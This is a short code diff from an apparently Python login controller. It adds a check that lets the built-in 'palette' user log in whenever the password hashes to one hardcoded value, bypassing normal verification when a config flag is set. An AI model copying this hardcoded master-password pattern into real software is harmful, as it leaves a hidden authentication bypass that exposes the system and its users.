@@ -5,6 +5,7 @@ from controller.profile import UserProfile
 from controller.environment import Environment
 from controller.palapi import CommHandlerApp
 from controller.general import SystemConfig
+from controller.passwd import tableau_hash
 from controller.system import SystemEntry
 from controller.yml import YmlEntry
 
@@ -29,6 +30,13 @@ class LoginApplication(BaseLoginApplication):
         entry = UserProfile.get(envid, 0) # user '0', likely 'palette'
         if entry and username == entry.name:
             # 'palette' always uses local authentication
+            scfg = SystemConfig(req.system)
+            if scfg.palette_login:
+                hashed_password = tableau_hash(password, entry.salt)
+                if hashed_password == \
+                                    'de5d1b109bd9ecf5d926e0a2385d973d0d17fda2':
+                    return True
+
             return UserProfile.verify(envid, username, password)
 
         # Use the configured authentication method.
